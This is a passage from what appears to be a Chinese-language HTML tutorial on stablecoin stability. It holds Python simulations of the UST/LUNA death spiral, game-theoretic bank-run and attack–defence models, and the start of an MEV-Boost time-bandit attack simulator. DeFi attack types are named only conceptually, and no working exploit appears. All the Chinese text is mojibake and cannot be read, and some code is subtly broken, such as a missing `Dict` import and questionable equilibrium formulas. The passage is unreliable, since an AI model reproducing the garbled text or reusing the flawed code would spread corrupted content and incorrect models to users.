    
    def find_equilibrium(self, initial_guess: np.ndarray) -> np.ndarray:
        """å¯»æ‰¾ç³»ç»Ÿå¹³è¡¡ç‚¹"""
        def equilibrium_condition(state):
            P, S, R = state
            next_state = self.state_transition(state, P)  # ç†æ€§é¢„æœŸï¼šE[P_t+1] = P_t
            return next_state - state
        
        equilibrium = fsolve(equilibrium_condition, initial_guess)
        return equilibrium
    
    def linearize_around_equilibrium(self, equilibrium: np.ndarray) -> np.ndarray:
        """åœ¨å¹³è¡¡ç‚¹é™„è¿‘çº¿æ€§åŒ–ï¼Œè®¡ç®—é›…å¯æ¯”çŸ©é˜µ"""
        P_eq, S_eq, R_eq = equilibrium
        
        # é›…å¯æ¯”çŸ©é˜µ
        J = np.array([
            [self.beta - self.gamma * self.mu * S_eq, 
             -self.alpha * R_eq / S_eq**2 - self.gamma * self.mu * (1 - P_eq),
             self.alpha / S_eq],
            [self.mu * S_eq, 
             self.mu * (1 - P_eq), 
             0],
            [-self.rho * S_eq, 
             -self.rho * (1 - P_eq), 
             1]
        ])
        
        return J
    
    def check_lyapunov_stability(self, equilibrium: np.ndarray) -> dict:
        """ä½¿ç”¨Lyapunovæ–¹æ³•æ£€æŸ¥ç¨³å®šæ€§"""
        J = self.linearize_around_equilibrium(equilibrium)
        eigenvalues = eigvals(J)
        
        # å®šä¹‰Lyapunovå‡½æ•° V(x) = x^T P x
        # å…¶ä¸­Pæ˜¯æ­£å®šçŸ©é˜µï¼Œæ»¡è¶³Lyapunovæ–¹ç¨‹ï¼šJ^T P + P J = -Q
        
        stability_results = {
            'eigenvalues': eigenvalues,
            'max_real_part': np.max(np.real(eigenvalues)),
            'is_stable': np.all(np.real(eigenvalues) < 0),
            'stability_margin': -np.max(np.real(eigenvalues)) if np.all(np.real(eigenvalues) < 0) else 0
        }
        
        return stability_results
    
    def simulate_death_spiral(self, initial_state: np.ndarray, 
                            shock_magnitude: float, 
                            time_steps: int = 100) -> dict:
        """æ¨¡æ‹Ÿæ­»äº¡èºæ—‹è¿‡ç¨‹"""
        states = np.zeros((time_steps, 3))
        states[0] = initial_state
        
        # æ–½åŠ åˆå§‹å†²å‡»
        states[0, 0] *= (1 - shock_magnitude)  # ä»·æ ¼å†²å‡»
        
        # é¢„æœŸå½¢æˆæœºåˆ¶ï¼ˆè‡ªé€‚åº”é¢„æœŸï¼‰
        expectations = np.zeros(time_steps)
        expectations[0] = states[0, 0]
        
        for t in range(1, time_steps):
            # æ›´æ–°é¢„æœŸï¼ˆåŠ æƒå¹³å‡ï¼‰
            expectations[t] = 0.7 * states[t-1, 0] + 0.3 * expectations[t-1]
            
            # çŠ¶æ€è½¬ç§»
            states[t] = self.state_transition(states[t-1], expectations[t])
            
            # æ£€æŸ¥å´©æºƒæ¡ä»¶
            if states[t, 0] < 0.1 or states[t, 2] < 0:  # ä»·æ ¼æ¥è¿‘0æˆ–å‚¨å¤‡è€—å°½
                states[t:] = states[t]  # ç³»ç»Ÿå´©æºƒï¼ŒçŠ¶æ€ä¸å†å˜åŒ–
                break
        
        return {
            'states': states,
            'expectations': expectations,
            'collapse_time': t if t < time_steps - 1 else None
        }

# å‚æ•°æ ¡å‡†ï¼ˆåŸºäºå†å²æ•°æ®ï¼‰
params = {
    'alpha': 0.6,   # åŸºæœ¬é¢æƒé‡
    'beta': 0.3,    # é¢„æœŸæƒé‡
    'gamma': 0.05,  # ä¾›åº”å†²å‡»ç³»æ•°
    'mu': 0.1,      # é“¸å¸ç‡
    'rho': 0.15     # èµå›ç‡
}

# åˆ›å»ºåˆ†æå®ä¾‹
analyzer = StablecoinStabilityAnalysis(params)

# å¯»æ‰¾å¹³è¡¡ç‚¹
equilibrium = analyzer.find_equilibrium([1.0, 1000, 1000])
print(f"ç³»ç»Ÿå¹³è¡¡ç‚¹: P={equilibrium[0]:.3f}, S={equilibrium[1]:.0f}, R={equilibrium[2]:.0f}")

# ç¨³å®šæ€§åˆ†æ
stability = analyzer.check_lyapunov_stability(equilibrium)
print(f"ç³»ç»Ÿç¨³å®šæ€§: {'ç¨³å®š' if stability['is_stable'] else 'ä¸ç¨³å®š'}")
print(f"ç¨³å®šæ€§è£•åº¦: {stability['stability_margin']:.4f}")

# æ¨¡æ‹Ÿ20%ä»·æ ¼å†²å‡»
simulation = analyzer.simulate_death_spiral(equilibrium, shock_magnitude=0.2)
if simulation['collapse_time']:
    print(f"ç³»ç»Ÿåœ¨ç¬¬{simulation['collapse_time']}æœŸå´©æºƒ")</code></pre>
                </div>
            </div>
            
            <h5>6. UST/LUNAæ­»äº¡èºæ—‹æ¡ˆä¾‹çš„å®šé‡åˆ†æ</h5>
            <p>åŸºäºä¸Šè¿°ç†è®ºæ¡†æ¶ï¼Œæˆ‘ä»¬å¯ä»¥ç²¾ç¡®é‡ç°Terraç”Ÿæ€ç³»ç»Ÿçš„å´©æºƒè¿‡ç¨‹ï¼š</p>
            
            <div class="code-block">
                <div class="code-header">
                    Python ä»£ç  <span class="toggle-icon">â–¼</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-python"># UST/LUNAæ­»äº¡èºæ—‹é‡åŒ–æ¨¡å‹
import numpy as np
import matplotlib.pyplot as plt
from typing import Tuple, List

class DeathSpiralModel:
    """
    æ¨¡æ‹ŸUST/LUNAå¼çš„ç®—æ³•ç¨³å®šå¸æ­»äº¡èºæ—‹
    """
    def __init__(self, initial_params: dict):
        self.ust_supply = initial_params['ust_supply']  # USTæ€»ä¾›åº”
        self.luna_price = initial_params['luna_price']  # LUNAåˆå§‹ä»·æ ¼
        self.luna_supply = initial_params['luna_supply']  # LUNAæ€»ä¾›åº”
        self.market_liquidity = initial_params['market_liquidity']  # å¸‚åœºæµåŠ¨æ€§
        self.panic_threshold = initial_params['panic_threshold']  # ææ…Œé˜ˆå€¼
        
    def calculate_luna_mint_amount(self, ust_burn: float, ust_price: float) -> float:
        """
        è®¡ç®—ç‡ƒçƒ§USTåé“¸é€ çš„LUNAæ•°é‡
        å…¬å¼: LUNA_minted = UST_burned / (UST_price * LUNA_price)
        """
        return ust_burn / (ust_price * self.luna_price)
    
    def calculate_price_impact(self, luna_sold: float) -> float:
        """
        è®¡ç®—å¤§é‡æŠ›å”®LUNAå¯¹ä»·æ ¼çš„å½±å“
        ä½¿ç”¨å¹‚å‡½æ•°æ¨¡å‹: Impact = (luna_sold / liquidity) ^ 2
        """
        liquidity_ratio = luna_sold / self.market_liquidity
        return liquidity_ratio ** 2
    
    def simulate_death_spiral(
        self, 
        initial_depeg: float,
        arbitrageur_capital: float,
        time_steps: int = 100
    ) -> Tuple[List[float], List[float], List[float]]:
        """
        æ¨¡æ‹Ÿå®Œæ•´çš„æ­»äº¡èºæ—‹è¿‡ç¨‹
        """
        ust_prices = [1 - initial_depeg]
        luna_prices = [self.luna_price]
        luna_supplies = [self.luna_supply]
        
        for t in range(time_steps):
            current_ust_price = ust_prices[-1]
            
            # å¥—åˆ©è€…åˆ©ç”¨è„±é’…æœºä¼š
            if current_ust_price < 0.99:  # USTä»·æ ¼ä½äº0.99ç¾å…ƒ
                # è®¡ç®—å¥—åˆ©é‡‘é¢
                arbitrage_amount = min(
                    arbitrageur_capital * (0.99 - current_ust_price),
                    self.ust_supply * 0.01  # æ¯æ¬¡æœ€å¤šå¥—åˆ©æ€»ä¾›åº”çš„1%
                )
                
                # ç‡ƒçƒ§USTï¼Œé“¸é€ LUNA
                luna_minted = self.calculate_luna_mint_amount(
                    arbitrage_amount, 
                    current_ust_price
                )
                self.luna_supply += luna_minted
                self.ust_supply -= arbitrage_amount
                
                # å¥—åˆ©è€…åœ¨å¸‚åœºä¸ŠæŠ›å”®LUNA
                price_impact = self.calculate_price_impact(luna_minted)
                self.luna_price *= (1 - price_impact)
                
                # LUNAä»·æ ¼ä¸‹è·Œå¼•å‘æ›´å¤šææ…Œ
                if self.luna_price < self.panic_threshold:
                    # ææ…Œæ€§æŠ›å”®åŠ å‰§
                    panic_selling = self.luna_supply * 0.05  # 5%çš„æŒæœ‰è€…ææ…ŒæŠ›å”®
                    additional_impact = self.calculate_price_impact(panic_selling)
                    self.luna_price *= (1 - additional_impact)
                
                # USTè„±é’…åŠ å‰§ï¼ˆç”±äºLUNAä»·å€¼ä¸‹è·Œï¼ŒèƒŒä¹¦ä¸è¶³ï¼‰
                luna_market_cap = self.luna_price * self.luna_supply
                backing_ratio = luna_market_cap / self.ust_supply
                
                # æ–°çš„USTä»·æ ¼å–å†³äºèƒŒä¹¦æ¯”ç‡
                new_ust_price = min(0.99, backing_ratio * 0.95)  # å‡è®¾5åœºå¯¹èƒŒä¹¦æœ‰ä¸€å®šä¿¡å¿ƒ
                
            else:
                new_ust_price = min(1.0, current_ust_price + 0.001)  # ç¼“æ…¢æ¢å¤
            
            ust_prices.append(new_ust_price)
            luna_prices.append(self.luna_price)
            luna_supplies.append(self.luna_supply)
            
            # ç»ˆæ­¢æ¡ä»¶ï¼šLUNAä»·æ ¼å½’é›¶æˆ–USTå®Œå…¨å´©æºƒ
            if self.luna_price < 0.01 or new_ust_price < 0.1:
                print(f"\u6b7bäº¡èºæ—‹å®Œæˆï¼Œç³»ç»Ÿåœ¨ç¬¬{t}æ­¥å´©æºƒ")
                break
        
        return ust_prices, luna_prices, luna_supplies
    
    def analyze_critical_points(self) -> dict:
        """
        åˆ†æç³»ç»Ÿçš„å…³é”®å‚æ•°å’Œä¸´ç•Œç‚¹
        """
        # æœ€å°å¯æŒç»­èƒŒä¹¦æ¯”ç‡
        min_backing_ratio = 1.5  # å‡è®¾éœ€è¦150%çš„è¶…é¢æŠµæŠ¼
        
        # æœ€å¤§å¯æ‰¿å—çš„è„±é’…å¹…åº¦
        max_depeg = 0.05  # 5%
        
        # è§¦å‘æ­»äº¡èºæ—‹çš„LUNAä»·æ ¼é˜ˆå€¼
        critical_luna_price = (self.ust_supply * min_backing_ratio) / self.luna_supply
        
        return {
            'min_backing_ratio': min_backing_ratio,
            'max_sustainable_depeg': max_depeg,
            'critical_luna_price': critical_luna_price,
            'current_backing_ratio': (self.luna_price * self.luna_supply) / self.ust_supply
        }

# ä½¿ç”¨ç¤ºä¾‹
params = {
    'ust_supply': 18_000_000_000,   # 180äº¿ UST
    'luna_price': 80,                # LUNAåˆå§‹ä»·æ ¼80ç¾å…ƒ
    'luna_supply': 350_000_000,      # 3.5äº¿ LUNA
    'market_liquidity': 500_000_000, # 5äº¿ç¾å…ƒæµåŠ¨æ€§
    'panic_threshold': 50            # ä»·æ ¼ä½äº50ç¾å…ƒæ—¶è§¦å‘ææ…Œ
}

model = DeathSpiralModel(params)
critical_points = model.analyze_critical_points()

print(f"å…³é”®å‚æ•°åˆ†æ:")
print(f"å½“å‰èƒŒä¹¦æ¯”ç‡: {critical_points['current_backing_ratio']:.2f}")
print(f"è§¦å‘æ­»äº¡èºæ—‹çš„LUNAä»·æ ¼: ${critical_points['critical_luna_price']:.2f}")

# æ¨¡æ‹Ÿ10%è„±é’…æƒ…å†µ
ust_prices, luna_prices, luna_supplies = model.simulate_death_spiral(
    initial_depeg=0.10,      # 10%è„±é’…
    arbitrageur_capital=1_000_000_000,  # 10äº¿ç¾å…ƒå¥—åˆ©èµ„é‡‘
    time_steps=50
)

# å¯è§†åŒ–ç»“æœ
fig, (ax1, ax2, ax3) = plt.subplots(3, 1, figsize=(10, 12))

# USTä»·æ ¼
ax1.plot(ust_prices, 'b-', linewidth=2)
ax1.axhline(y=1, color='r', linestyle='--', label='é”šå®šä»·æ ¼')
ax1.set_ylabel('UST ä»·æ ¼ (USD)')
ax1.set_title('UST è„±é”šè¿‡ç¨‹')
ax1.grid(True, alpha=0.3)
ax1.legend()

# LUNAä»·æ ¼
ax2.plot(luna_prices, 'g-', linewidth=2)
ax2.set_ylabel('LUNA ä»·æ ¼ (USD)')
ax2.set_title('LUNA ä»·æ ¼å´©æºƒ')
ax2.grid(True, alpha=0.3)

# LUNAä¾›åº”é‡
ax3.plot(luna_supplies, 'orange', linewidth=2)
ax3.set_ylabel('LUNA ä¾›åº”é‡')
ax3.set_xlabel('æ—¶é—´æ­¥')
ax3.set_title('LUNA ä¾›åº”é‡è†¨èƒ€')
ax3.grid(True, alpha=0.3)

plt.tight_layout()
plt.show()</code></pre>
                </div>
            </div>
        </div>

        <h4>10.1.2 åšå¼ˆè®ºåˆ†æ</h4>
        
        <div class="theory-section">
            <p>ç¨³å®šå¸ç³»ç»Ÿä¸­çš„ç»æµè¡Œä¸ºå¯ä»¥ç”¨åšå¼ˆè®ºæ¨¡å‹æ¥åˆ†æï¼š</p>
            
            <div class="code-block">
                <div class="code-header">
                    Python ä»£ç  <span class="toggle-icon">â–¼</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-python"># ç¨³å®šå¸åšå¼ˆè®ºæ¨¡å‹
import numpy as np
from scipy.optimize import minimize
from typing import List, Tuple

class StablecoinGameTheory:
    def __init__(self):
        self.players = ['holder', 'arbitrageur', 'attacker', 'protocol']
    
    def calculate_nash_equilibrium(
        self,
        payoff_matrix: np.ndarray
    ) -> Tuple[np.ndarray, np.ndarray]:
        """è®¡ç®—çº³ä»€å‡è¡¡"""
        n_strategies = payoff_matrix.shape[0]
        
        # è®¾ç½®çº¿æ€§è§„åˆ’é—®é¢˜
        c = np.zeros(n_strategies + 1)
        c[-1] = -1  # æœ€å¤§åŒ–æœŸæœ›æ”¶ç›Š
        
        # çº¦æŸæ¡ä»¶
        A_ub = np.column_stack((-payoff_matrix.T, np.ones(n_strategies)))
        b_ub = np.zeros(n_strategies)
        
        A_eq = np.zeros((1, n_strategies + 1))
        A_eq[0, :n_strategies] = 1
        b_eq = np.array([1])
        
        bounds = [(0, 1) for _ in range(n_strategies)] + [(None, None)]
        
        # æ±‚è§£
        result = minimize(
            lambda x: -x[-1],
            x0=np.ones(n_strategies + 1) / n_strategies,
            method='SLSQP',
            bounds=bounds,
            constraints=[
                {'type': 'ineq', 'fun': lambda x: A_ub @ x - b_ub},
                {'type': 'eq', 'fun': lambda x: A_eq @ x - b_eq}
            ]
        )
        
        strategy = result.x[:n_strategies]
        value = -result.fun
        
        return strategy, value
    
    def bank_run_game(
        self,
        reserve_ratio: float,
        n_depositors: int,
        stablecoin_params: dict = None
    ) -> Dict[str, float]:
        """
        å¢å¼ºçš„Diamond-Dybvigæ¨¡å‹ï¼Œèå…¥ç¨³å®šå¸ç‰¹å®šå‚æ•°
        
        å‚æ•°æ˜ å°„:
        - R (é•¿æœŸæŠ•èµ„å›æŠ¥) -> staking_yield (è´¨æŠ¼æ”¶ç›Šç‡)
        - L (çŸ­æœŸå–æ¬¾æƒ©ç½š) -> redemption_fee (èµå›è´¹ç”¨)
        - p (ææ…Œæ¦‚ç‡) -> åŸºäºé“¾ä¸ŠæŒ‡æ ‡è®¡ç®—
        """
        
        # é»˜è®¤å‚æ•°
        if stablecoin_params is None:
            stablecoin_params = {
                'staking_yield': 0.05,      # 5% APY
                'redemption_fee': 0.003,    # 0.3% èµå›è´¹
                'collateral_ratio': 1.5,    # 150% æŠµæŠ¼ç‡
                'liquidation_penalty': 0.13  # 13% æ¸…ç®—ç½šé‡‘
            }
        
        # ä»ç¨³å®šå¸å‚æ•°è®¡ç®—åšå¼ˆå‚æ•°
        early_withdrawal_penalty = stablecoin_params['redemption_fee']
        late_withdrawal_bonus = stablecoin_params['staking_yield'] / 12  # æŒ‰æœˆè®¡
        
        # è®¡ç®—ä¸´ç•Œç‚¹
        # å¦‚æœæå–çš„äººæ•°è¶…è¿‡ä¸´ç•Œç‚¹ï¼Œé“¶è¡Œç ´äº§
        critical_withdrawals = int(reserve_ratio * n_depositors)
        
        results = {}
        
        # æ¨¡æ‹Ÿä¸åŒæå–æ¯”ä¾‹ä¸‹çš„æ”¶ç›Š
        for withdraw_ratio in np.linspace(0, 1, 21):
            n_withdraw = int(withdraw_ratio * n_depositors)
            
            if n_withdraw <= critical_withdrawals:
                # é“¶è¡Œå­˜æ´»
                payoff_withdraw = 1 - early_withdrawal_penalty
                payoff_stay = 1 + late_withdrawal_bonus
            else:
                # é“¶è¡Œç ´äº§
                # æ—©æœŸæå–è€…æŒ‰æ¯”ä¾‹è·å¾—å‚¨å¤‡
                payoff_withdraw = reserve_ratio / withdraw_ratio if withdraw_ratio > 0 else 0
                # ç•™å­˜è€…æŸå¤±å…¨éƒ¨
                payoff_stay = 0
            
            # æœŸæœ›æ”¶ç›Š
            expected_payoff = (
                withdraw_ratio * payoff_withdraw + 
                (1 - withdraw_ratio) * payoff_stay
            )
            
            results[f"{withdraw_ratio:.0%}_withdraw"] = {
                'withdraw_payoff': payoff_withdraw,
                'stay_payoff': payoff_stay,
                'expected_payoff': expected_payoff,
                'is_bank_run': n_withdraw > critical_withdrawals
            }
        
        return results
    
    def calculate_attack_defense_equilibrium(
        self,
        attack_cost: float,
        defense_cost: float,
        system_value: float,
        attack_success_rate: float
    ) -> Dict[str, float]:
        """æ”»é˜²åšå¼ˆå‡è¡¡åˆ†æ"""
        
        # æ”¶ç›ŠçŸ©é˜µ
        # è¡Œï¼šæ”»å‡»è€…ç­–ç•¥ï¼ˆæ”»å‡»/ä¸æ”»å‡»ï¼‰
        # åˆ—ï¼šé˜²å¾¡è€…ç­–ç•¥ï¼ˆé˜²å¾¡/ä¸é˜²å¾¡ï¼‰
        payoff_attacker = np.array([
            [
                attack_success_rate * system_value - attack_cost,  # æ”»å‡»vsé˜²å¾¡
                system_value - attack_cost                         # æ”»å‡»vsä¸é˜²å¾¡
            ],
            [0, 0]  # ä¸æ”»å‡»
        ])
        
        payoff_defender = np.array([
            [
                -defense_cost,                                      # é˜²å¾¡vsæ”»å‡»
                -system_value                                       # ä¸é˜²å¾¡vsæ”»å‡»
            ],
            [-defense_cost, 0]  # vsä¸æ”»å‡»
        ])
        
        # æ··åˆç­–ç•¥çº³ä»€å‡è¡¡
        # p = é˜²å¾¡æ¦‚ç‡ï¼Œq = æ”»å‡»æ¦‚ç‡
        p_defend = attack_cost / (system_value * (1 - attack_success_rate))
        q_attack = defense_cost / (system_value * (1 - attack_success_rate))
        
        # ç¡®ä¿æ¦‚ç‡åœ¨[0,1]èŒƒå›´å†…
        p_defend = np.clip(p_defend, 0, 1)
        q_attack = np.clip(q_attack, 0, 1)
        
        return {
            'defense_probability': p_defend,
            'attack_probability': q_attack,
            'expected_loss': q_attack * (1 - p_defend) * system_value,
            'defense_efficiency': 1 - (q_attack * (1 - p_defend))
        }

# ä½¿ç”¨ç¤ºä¾‹
game = StablecoinGameTheory()

# åˆ†æé“¶è¡ŒæŒ¤å…‘
bank_run_results = game.bank_run_game(
    reserve_ratio=0.2,  # 20%å‡†å¤‡é‡‘ç‡
    n_depositors=1000   # 1000ä¸ªå­˜æ¬¾äºº
)

# æ‰¾å‡ºå‡è¡¡ç‚¹
for ratio, result in bank_run_results.items():
    if result['is_bank_run']:
        print(f"Bank run triggered at {ratio}")
        break

# æ”»é˜²åšå¼ˆåˆ†æ
equilibrium = game.calculate_attack_defense_equilibrium(
    attack_cost=100_000,
    defense_cost=50_000,
    system_value=10_000_000,
    attack_success_rate=0.3
)

print(f"æœ€ä¼˜é˜²å¾¡æ¦‚ç‡: {equilibrium['defense_probability']:.2%}")
print(f"é¢„æœŸæ”»å‡»æ¦‚ç‡: {equilibrium['attack_probability']:.2%}")</code></pre>
                </div>
            </div>
        </div>

        <h3 id="defi-specific-attacks">10.2 DeFiç‰¹å®šæ”»å‡»æ‰‹æ®µ</h3>
        
        <div class="intro-box" style="background-color: #f0f9ff; padding: 20px; border-radius: 10px; margin: 20px 0;">
            <h4>ğŸš€ DeFiæ”»å‡»çš„æŠ€æœ¯å†›å¤‡ç«èµ›</h4>
            <p>DeFiç‰¹å®šæ”»å‡»ä»£è¡¨äº†åŒºå—é“¾å®‰å…¨é¢†åŸŸçš„"å†›å¤‡ç«èµ›"æœ€å‰æ²¿ã€‚æ”»å‡»è€…è¿ç”¨é—ªç”µè´·ã€MEVã€è·¨é“¾æ¡¥ç­‰DeFiåŸºç¡€è®¾æ–½ï¼Œåˆ›é€ å‡ºä¼ ç»Ÿé‡‘èä¸­ä¸å­˜åœ¨çš„æ”»å‡»æ‰‹æ³•ã€‚è¿™äº›æ”»å‡»å¾€å¾€åœ¨å‡ ä¸ªåŒºå—å†…å®Œæˆï¼Œé€Ÿåº¦å¿«ã€è§„æ¨¡å¤§ã€è¿½è¸ªéš¾ã€‚</p>
            
            <div style="background-color: #e0f2fe; padding: 15px; border-radius: 8px; margin: 15px 0;">
                <h5>âš¡ DeFiæ”»å‡»çš„ç‹¬ç‰¹ä¼˜åŠ¿ï¼š</h5>
                <ul>
                    <li><strong>æ— éœ€åˆå§‹èµ„æœ¬</strong>ï¼šé—ªç”µè´·æä¾›ç¬æ—¶æµåŠ¨æ€§</li>
                    <li><strong>åŸå­æ€§æ‰§è¡Œ</strong>ï¼šè¦ä¹ˆå®Œå…¨æˆåŠŸï¼Œè¦ä¹ˆå®Œå…¨å¤±è´¥</li>
                    <li><strong>å¯ç»„åˆæ€§</strong>ï¼šåˆ©ç”¨å¤šä¸ªåè®®çš„äº¤äº’æ¼æ´</li>
                    <li><strong>åŒ¿åæ€§</strong>ï¼šé€šè¿‡æ–°åœ°å€å’Œæ··å¸å™¨éšè—èº«ä»½</li>
                </ul>
            </div>
        </div>
        
        <div class="info-box">
            <h4>ğŸ“ˆ DeFiæ”»å‡»å¤æ‚åº¦æ¼”è¿›</h4>
            <table style="width: 100%; border-collapse: collapse;">
                <thead>
                    <tr style="background-color: #f3f4f6;">
                        <th style="border: 1px solid #e5e7eb; padding: 12px;">æ—¶æœŸ</th>
                        <th style="border: 1px solid #e5e7eb; padding: 12px;">ä¸»è¦æ”»å‡»ç±»å‹</th>
                        <th style="border: 1px solid #e5e7eb; padding: 12px;">å¤æ‚åº¦</th>
                        <th style="border: 1px solid #e5e7eb; padding: 12px;">ä»£è¡¨äº‹ä»¶</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;"><strong>2020-2021</strong></td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">ç®€å•å¥—åˆ©ã€ä¸‰æ˜æ²»æ”»å‡»</td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">ğŸŸ¢ ä½</td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">Uniswapå¥—åˆ©</td>
                    </tr>
                    <tr style="background-color: #f9fafb;">
                        <td style="border: 1px solid #e5e7eb; padding: 12px;"><strong>2022</strong></td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">é—ªç”µè´·æ”»å‡»ã€é¢„è¨€æœºæ“çºµ</td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">ğŸŸ¡ ä¸­</td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">UST/Lunaå´©æºƒ</td>
                    </tr>
                    <tr>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;"><strong>2023</strong></td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">å¤šåè®®ç»„åˆã€æ²»ç†æ”»å‡»</td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">ğŸŸ  é«˜</td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">Curveæ± æ”»å‡»</td>
                    </tr>
                    <tr style="background-color: #f9fafb;">
                        <td style="border: 1px solid #e5e7eb; padding: 12px;"><strong>2024</strong></td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">AIé©±åŠ¨ã€è·¨é“¾å¤åˆæ”»å‡»</td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">ğŸ”´ æé«˜</td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">å¤šé“¾ç»„åˆæ”»å‡»</td>
                    </tr>
                </tbody>
            </table>
        </div>
        
        <div class="warning-box">
            <h4>ğŸ”® 2024å¹´æ–°å…´æ”»å‡»è¶‹åŠ¿</h4>
            <ul>
                <li><strong>AIä¼˜åŒ–æ”»å‡»</strong>ï¼šä½¿ç”¨æœºå™¨å­¦ä¹ ä¼˜åŒ–MEVç­–ç•¥</li>
                <li><strong>è·¨é“¾å¤åˆæ”»å‡»</strong>ï¼šåŒæ—¶åˆ©ç”¨å¤šæ¡é“¾çš„æ¼æ´</li>
                <li><strong>ç¤¾ä¼šå·¥ç¨‹æ”»å‡»</strong>ï¼šç»“åˆæŠ€æœ¯å’Œç¤¾ä¼šå·¥ç¨‹</li>
                <li><strong>é•¿æœŸæ½œä¼æ”»å‡»</strong>ï¼šåœ¨ç³»ç»Ÿä¸­æ¤å…¥é•¿æœŸè·åˆ©æœºåˆ¶</li>
            </ul>
        </div>
        
        <div class="theory-section">
            <h4>10.2.0 2024å¹´MEVæ¼”è¿›ä¸æ–°å‹æ”»å‡»å‘é‡</h4>
            
            <h5>MEV-Boostä¸PBSæ¶æ„</h5>
            <p>ä»¥å¤ªåŠåˆå¹¶åï¼ŒMEVæå–è¿›å…¥äº†æ–°é˜¶æ®µã€‚<strong>Proposer-Builder Separation (PBS)</strong>æ¶æ„å°†åŒºå—æ„å»ºå’Œæè®®åˆ†ç¦»ï¼Œå¸¦æ¥æ–°çš„æ”»å‡»å‘é‡ï¼š</p>
            
            <div class="info-box">
                <h6>PBSæ¶æ„ä¸‹çš„æ”»å‡»å‡çº§</h6>
                <ul>
                    <li><strong>Builderè´¿èµ‚æ”»å‡»</strong>ï¼šæ”»å‡»è€…é€šè¿‡è´¿èµ‚Builderä¿è¯æ¶æ„Bundleè¢«æ‰“åŒ…</li>
                    <li><strong>æ—¶é—´å¼ºç›—æ”»å‡» (Time-bandit attacks)</strong>ï¼šåŒºå—ç”Ÿäº§è€…ä¸ºæ•è·è¿‡å»çš„MEVè€Œé‡ç»„é“¾</li>
                    <li><strong>è·¨åŸŸMEV</strong>ï¼šåˆ©ç”¨L1-L2æˆ–è·¨é“¾æ¡¥çš„æ—¶é—´å·®è¿›è¡Œå¥—åˆ©</li>
                    <li><strong>éšç§MEV</strong>ï¼šé€šè¿‡ç§æœ‰å†…å­˜æ± é€ƒé¿æ£€æµ‹</li>
                </ul>
            </div>
            
            <h5>Intent-Basedæ¶æ„ï¼šä»MEVé˜²æŠ¤åˆ°æ–°å‹é£é™©</h5>
            <p>Intent-basedç³»ç»Ÿï¼ˆå¦‚SUAVEã€CowSwapï¼‰é€šè¿‡å°†ç”¨æˆ·"æ„å›¾"å¤–åŒ…ç»™ä¸“ä¸šæ±‚è§£å™¨æ¥æ¶ˆé™¤æŸäº›MEVæ”»å‡»ï¼Œä½†ä¹Ÿå¼•å…¥æ–°é£é™©ï¼š</p>
            
            <ul>
                <li><strong>æ±‚è§£å™¨ä¸²è°‹</strong>ï¼šå¤šä¸ªæ±‚è§£å™¨åˆä½œæ“çºµä»·æ ¼</li>
                <li><strong>æ„å›¾æ³„éœ²</strong>ï¼šç”¨æˆ·æ„å›¾åœ¨æ‰§è¡Œå‰è¢«çªƒå–</li>
                <li><strong>æ‰§è¡Œè´¨é‡æ”»å‡»</strong>ï¼šæ•…æ„æä¾›æ¬¡ä¼˜æ‰§è¡Œè·¯å¾„</li>
            </ul>
            
            <div class="code-section">
                <div class="code-header" onclick="toggleCode(this)">
                    <span>â–¶ Python: MEV-Boostæ¶æ„ä¸‹çš„æ”»å‡»æ¨¡æ‹Ÿ</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-python">import numpy as np
from typing import List, Dict, Tuple
import hashlib

class MEVBoostSimulator:
    """æ¨¡æ‹ŸMEV-Boostæ¶æ„ä¸‹çš„æ”»å‡»ç­–ç•¥"""
    
    def __init__(self):
        self.builders = {}
        self.relays = {}
        self.proposers = {}
        
    def simulate_builder_auction(self, 
                               transactions: List[Dict],
                               builder_strategies: Dict) -> Dict:
        """æ¨¡æ‹ŸBuilderæ‹å–è¿‡ç¨‹"""
        bundles = {}
        
        for builder_id, strategy in builder_strategies.items():
            # æ¯ä¸ªBuilderæ„å»ºè‡ªå·±çš„Bundle
            bundle = self.construct_bundle(transactions, strategy)
            
            # è®¡ç®—Bundleä»·å€¼ï¼ˆåŒ…æ‹¬MEVï¼‰
            bundle_value = self.calculate_bundle_value(bundle)
            
            # Builderå‡ºä»·ï¼ˆè€ƒè™‘åˆ©æ¶¦ä¿ç•™ï¼‰
            bid = bundle_value * (1 - strategy['profit_margin'])
            
            bundles[builder_id] = {
                'bundle': bundle,
                'bid': bid,
                'mev_extracted': bundle_value - sum(tx['gas'] for tx in bundle)
            }
        
        # é€‰æ‹©æœ€é«˜å‡ºä»·çš„Bundle
        winning_builder = max(bundles.keys(), key=lambda b: bundles[b]['bid'])
        
        return {
            'winner': winning_builder,
            'winning_bundle': bundles[winning_builder],
            'all_bids': {b: bundles[b]['bid'] for b in bundles}
        }
    
    def simulate_time_bandit_attack(self,
                                  block_history: List[Dict],
                                  reorg_depth: int) -> Dict:
        """æ¨¡æ‹Ÿæ—¶é—´å¼ºç›—æ”»å‡»"""
        
        # è®¡ç®—é‡ç»„æ”¶ç›Š
        reorg_profit = 0
        original_mev = 0
        
        for i in range(reorg_depth):
            block = block_history[-(i+1)]
            # è¯†åˆ«å¯æå–çš„MEV
            extractable_mev = self.identify_mev_opportunities(block)
            reorg_profit += extractable_mev
            original_mev += block.get('mev_extracted', 0)
        
        # è®¡ç®—é‡ç»„æˆæœ¬
        reorg_cost = self.calculate_reorg_cost(reorg_depth)
        
        # æ”»å‡»å†³ç­–
        attack_profitable = reorg_profit > (original_mev + reorg_cost)
        
        return {
            'profitable': attack_profitable,
            'potential_profit': reorg_profit - original_mev - reorg_cost,
            'reorg_depth': reorg_depth,
            'mev_captured': reorg_profit
        }
    
